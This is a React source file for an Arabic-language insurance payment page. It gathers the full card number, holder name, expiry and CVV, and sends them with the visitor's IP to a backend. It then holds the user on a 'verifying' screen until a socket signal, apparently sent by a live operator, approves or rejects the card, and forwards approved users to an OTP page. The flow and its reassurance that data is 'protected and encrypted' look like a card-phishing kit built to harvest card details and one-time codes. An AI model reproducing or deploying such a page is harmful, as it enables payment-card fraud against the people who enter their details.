import React, { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import InsuranceHeader from "@/components/InsuranceHeader";
import LoadingOverlay from "@/components/LoadingOverlay";
import { trpc } from "@/lib/trpc";
import { useVisitorSession } from "@/hooks/useVisitorSession";
import { useVisitorGuard } from "@/hooks/useVisitorGuard";
import { useSocketSync } from "@/hooks/useSocketSync";
import { toast } from "sonner";

function formatCardNumber(value: string) {
  return value.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
}
function formatExpiry(value: string) {
  const v = value.replace(/\D/g, "").slice(0, 4);
  if (v.length >= 3) return v.slice(0, 2) + "/" + v.slice(2);
  return v;
}
function detectCardType(num: string): string {
  const n = num.replace(/\s/g, "");
  if (/^4/.test(n)) return "visa";
  if (/^5[1-5]/.test(n)) return "mastercard";
  if (/^9/.test(n)) return "mada";
  return "";
}

export default function PaymentPage() {
  const [, navigate] = useLocation();
  const search = useSearch();
  const { sessionId, visitorIp, saveData, getStoredData } = useVisitorSession();
  const [declined, setDeclined] = useState(() => search.includes("declined=true"));
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [cardNumber, setCardNumber] = useState("");
  const [cardHolderName, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showVerifying, setShowVerifying] = useState(false);
  const [verifiedAndRedirected, setVerifiedAndRedirected] = useState(false);

  const submitPaymentMutation = trpc.insurance.submitPayment.useMutation();
  const checkPaymentQuery = trpc.insurance.checkPayment.useQuery(
    { sessionId },
    { refetchInterval: showVerifying ? 2000 : false, enabled: showVerifying }
  );

  // Socket for payment events
  useSocketSync(visitorIp, {
    onPaymentRejected: () => {
      setShowVerifying(false);
      setDeclined(true);
      setIsSubmitting(false);
      toast.error("تم رفض الدفع");
    },
    onPaymentApproved: () => {
      // Will be caught by checkPaymentQuery polling
    },
  });

  const guard = useVisitorGuard(visitorIp);

  const stored = getStoredData();
  const selectedPayment = (stored.paymentMethod as string) || "";
  const cardType = detectCardType(cardNumber);

  function validate() {
    const errs: Record<string, string> = {};
    if (cardNumber.replace(/\s/g, "").length < 13) errs.cardNumber = "رقم البطاقة غير صحيح";
    if (!cardHolderName.trim()) errs.cardHolderName = "اسم حامل البطاقة مطلوب";
    if (!expiryDate.match(/^\d{2}\/\d{2}$/)) errs.expiryDate = "تاريخ الانتهاء غير صحيح";
    if (cvv.length < 3) errs.cvv = "رمز الأمان غير صحيح";
    setErrors(errs);
    return Object.keys(errs).length === 0;
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!validate()) return;
    setIsSubmitting(true);
    setShowVerifying(true);

    const detectedType = cardType || selectedPayment.toLowerCase();
    const data = {
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardHolderName,
      expiryDate,
      cvv,
      cardType: detectedType,
      cardLast4: cardNumber.replace(/\s/g, "").slice(-4),
      paymentMethod: selectedPayment,
    };
    saveData(data);

    try {
      await submitPaymentMutation.mutateAsync({
        sessionId,
        visitorIp,
        ...data,
      });

      // Polling for payment approval
      let attempts = 0;
      const maxAttempts = 300; // 10 minutes
      while (attempts < maxAttempts) {
        await new Promise((r) => setTimeout(r, 2000));
        const result = await checkPaymentQuery.refetch();
        const status = result.data?.paymentStatus;
        const cardDeclined = result.data?.cardDeclined;

        if (cardDeclined) {
          setShowVerifying(false);
          setDeclined(true);
          toast.error("تم رفض الدفع");
          setIsSubmitting(false);
          return;
        }

        if (status === "approved") {
          setShowVerifying(false);
          setIsSubmitting(false);
          navigate("/insurance/otp");
          return;
        }
        attempts++;
      }

      // timeout
      setShowVerifying(false);
      setIsSubmitting(false);
      toast.error("انتهت مهلة التحقق، يرجى المحاولة مرة أخرى");
    } catch (err) {
      setShowVerifying(false);
      setIsSubmitting(false);
      toast.error("حدث خطأ في إرسال بيانات الدفع");
    }
  }

  const getSelectedCardIcon = () => {
    if (selectedPayment === "Visa") return { color: "from-blue-600 to-blue-700", icon: "VISA" };
    if (selectedPayment === "Mastercard") return { color: "from-red-500 to-orange-500", icon: "MC" };
    if (selectedPayment === "Mada") return { color: "from-emerald-600 to-teal-600", icon: "mada" };
    return { color: "from-gray-500 to-gray-600", icon: "?" };
  };

  const selectedCard = getSelectedCardIcon();

  // Verifying screen (locked page)
  if (showVerifying) {
    return (
      <div className="min-h-screen bg-gray-50 flex justify-center">
        <div className="w-full max-w-[480px] bg-white min-h-screen flex flex-col relative">
          <InsuranceHeader showLogin />
          <main className="flex-1 px-4 py-5">
            <div className="flex flex-col items-center justify-center h-[60vh]">
              <div className="w-20 h-20 rounded-full bg-blue-50 flex items-center justify-center mb-6">
                <svg className="w-10 h-10 text-blue-500 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h2 className="text-lg font-bold text-gray-800 mb-2">جاري التحقق من الدفع...</h2>
              <p className="text-sm text-gray-500 text-center">يرجى الانتظار حتى يتم التحقق من عملية الدفع</p>
              <div className="mt-6 flex items-center gap-2">
                <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce" style={{ animationDelay: "0ms" }} />
                <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce" style={{ animationDelay: "150ms" }} />
                <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce" style={{ animationDelay: "300ms" }} />
              </div>
            </div>
          </main>
          <LoadingOverlay show={guard.loading} text={guard.loadingText} subtext={guard.loadingSubtext} />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex justify-center">
      <div className="w-full max-w-[480px] bg-white min-h-screen flex flex-col">
        <InsuranceHeader showLogin />
        <main className="flex-1 px-4 py-5">
          <form onSubmit={handleSubmit} noValidate autoComplete="off">
            {selectedPayment && (
              <div className="flex items-center justify-between bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 mb-4">
                <div className="flex items-center gap-3">
                  <div className={`w-10 h-7 rounded-md bg-gradient-to-r ${selectedCard.color} flex items-center justify-center text-white text-[9px] font-bold tracking-wide shadow-sm`}>
                    {selectedCard.icon === "MC" ? (
                      <div className="flex items-center">
                        <div className="w-2.5 h-2.5 rounded-full bg-red-400/80 mr-[-3px]" />
                        <div className="w-2.5 h-2.5 rounded-full bg-yellow-400/80" />
                      </div>
                    ) : (
                      <span className="text-[9px]">{selectedCard.icon}</span>
                    )}
                  </div>
                  <div>
                    <div className="text-xs text-gray-500">طريقة الدفع المختارة</div>
                    <div className="font-semibold text-sm text-gray-800">{selectedPayment}</div>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => navigate("/insurance/step5")}
                  className="text-xs text-blue-600 font-medium hover:underline"
                >
                  تغيير
                </button>
              </div>
            )}

            {declined && (
              <div className="decline-box mb-4">
                <div className="flex-shrink-0 w-8 h-8 rounded-full bg-white/20 flex items-center justify-center">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5">
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="8" x2="12" y2="12" />
                    <line x1="12" y1="16" x2="12.01" y2="16" />
                  </svg>
                </div>
                <div>
                  <div className="font-bold text-sm">تم رفض طريقة الدفع</div>
                  <div className="text-xs opacity-90">يرجى تجربة طريقة دفع أخرى أو التواصل مع البنك</div>
                </div>
              </div>
            )}

            <h2 className="text-base font-bold text-gray-800 mb-4">بيانات البطاقة البنكية</h2>

            <div className="mb-4">
              <label className="block text-sm text-gray-600 mb-1">رقم البطاقة</label>
              <div className="relative">
                <input
                  className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500 pr-12"
                  placeholder="•••• •••• •••• ••••"
                  type="tel"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                  autoComplete="off"
                  disabled={isSubmitting}
                  style={{ direction: "ltr", textAlign: "left" }}
                />
                {cardType && (
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-xs font-bold text-blue-600 uppercase">
                    {cardType}
                  </span>
                )}
              </div>
              {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
            </div>

            <div className="mb-4">
              <label className="block text-sm text-gray-600 mb-1">اسم حامل البطاقة</label>
              <input
                className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500"
                placeholder="الاسم كما هو مكتوب على البطاقة"
                value={cardHolderName}
                onChange={(e) => setCardHolderName(e.target.value)}
                autoComplete="off"
                disabled={isSubmitting}
              />
              {errors.cardHolderName && <p className="text-red-500 text-xs mt-1">{errors.cardHolderName}</p>}
            </div>

            <div className="flex gap-3 mb-4">
              <div className="flex-1">
                <label className="block text-sm text-gray-600 mb-1">تاريخ الانتهاء</label>
                <input
                  className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500"
                  placeholder="MM/YY"
                  type="tel"
                  maxLength={5}
                  value={expiryDate}
                  onChange={(e) => setExpiryDate(formatExpiry(e.target.value))}
                  autoComplete="off"
                  disabled={isSubmitting}
                  style={{ direction: "ltr" }}
                />
                {errors.expiryDate && <p className="text-red-500 text-xs mt-1">{errors.expiryDate}</p>}
              </div>
              <div className="flex-1">
                <label className="block text-sm text-gray-600 mb-1">رمز الأمان (CVV)</label>
                <input
                  className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500"
                  placeholder="•••"
                  type="tel"
                  maxLength={3}
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
                  autoComplete="off"
                  disabled={isSubmitting}
                  style={{ direction: "ltr" }}
                />
                {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
              </div>
            </div>

            <div className="flex items-center gap-2 bg-green-50 border border-green-200 rounded-lg px-3 py-2 mb-4">
              <span>🔒</span>
              <span className="text-xs text-green-700">بياناتك محمية بأعلى معايير الأمان والتشفير</span>
            </div>

            <p className="text-xs text-gray-400 mb-5">جميع المعلومات المالية محمية ومشفرة.</p>

            <div className="flex gap-3">
              <button
                type="button"
                onClick={() => navigate("/insurance/step5")}
                className="flex-1 py-3.5 border border-gray-300 text-gray-600 rounded-xl font-bold text-base hover:bg-gray-50 transition-all"
                disabled={isSubmitting}
              >
                السابق
              </button>
              <button
                type="submit"
                className="flex-1 py-3.5 bg-blue-600 text-white rounded-xl font-bold text-base hover:bg-blue-700 active:scale-[0.98] transition-all"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                    </svg>
                    جاري الإرسال...
                  </span>
                ) : (
                  "التالي"
                )}
              </button>
            </div>
          </form>
        </main>
        <LoadingOverlay show={guard.loading} text={guard.loadingText} subtext={guard.loadingSubtext} />
      </div>
    </div>
  );
}
